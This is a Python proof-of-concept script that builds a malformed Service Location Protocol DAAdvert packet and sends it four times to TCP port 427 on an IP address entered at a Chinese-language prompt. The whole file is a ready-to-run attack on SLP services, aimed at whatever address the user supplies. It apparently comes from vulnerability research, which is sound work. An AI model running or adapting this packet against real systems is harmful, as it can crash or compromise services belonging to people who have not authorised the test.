import socket

print('''
              _ _ _ _
              (_) (_) (_|_)
  ___ ___ ___ _| |_ _ _ _ _ _ _
 / __/ _ \/ __| | | |/ _` |/ _` | | |
| (_| __/ (__| | | | (_| | (_| | | |
 \___\___|\___|_|_|_|\__,_|\__,_|_|_|                                    
                                author@ceciliaaii
''')
header = b"\x02" + b"\x08" + b"\x00\x00\x49" + b"\x00\x00" + b"\x00\x00\x00" + b"\x00\x00" + b"\x00\x02" + b"\x65\x6e"
daadvert = b"\x00\x00" + b"\x00\x00\x01\x00" + b"\x00\x14" + b"http://www.baidu.com" + b"\x00\x0a" + b"abcdefghij" + b"\x00\x0a" + b"pppppppppp" + b"\x00\x02" + b"bb" + b"\x00"
poc = header + daadvert
tcpClientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Edit your server ip
ipaddr = input("请输入要测试的IP地址：")
serverAddr = (ipaddr, 427)
tcpClientSocket.connect(serverAddr)
print('connect success!!!')
tcpClientSocket.send(poc)
tcpClientSocket.send(poc)
tcpClientSocket.send(poc)
tcpClientSocket.send(poc)
tcpClientSocket.close()
print('[ * ]关闭连接')
